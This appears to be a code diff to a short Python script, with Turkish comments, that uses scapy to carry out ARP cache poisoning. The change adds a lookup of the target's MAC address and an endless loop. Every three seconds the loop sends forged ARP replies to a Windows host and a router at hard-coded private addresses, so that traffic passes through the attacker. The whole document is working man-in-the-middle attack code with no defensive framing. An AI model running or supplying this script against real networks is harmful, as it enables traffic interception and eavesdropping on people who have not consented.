@@ -1,4 +1,6 @@
+from time import time
 import scapy.all as scapy
+import time
 
 
 #Mac Adresini alıyoruz bu fonksiyonla
@@ -14,8 +16,12 @@ def get_mac_addres(ip):
     
 def arp_poisoning(target_ip,poisoned_ip):
     #poisoned ip dedigimiz sey modem veya router ip sidir.
-    arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst="18-56-80-B9-D6-3D",psrc=poisoned_ip)
+    target_mac = get_mac_addres(target_ip)
+    arp_response = scapy.ARP(op=2,pdst=target_ip,hwdst=target_mac,psrc=poisoned_ip)
     scapy.send(arp_response)
     
+while True:
+    arp_poisoning("192.168.1.101","192.168.218.1") #windows makinesi icin bu
+    arp_poisoning("192.168.218.1","192.168.1.101") #modemin bizi windows makinesi olarak algılamasını saglamak icin
     
-get_mac_addres("192.168.1.101")
+    time.sleep(3)
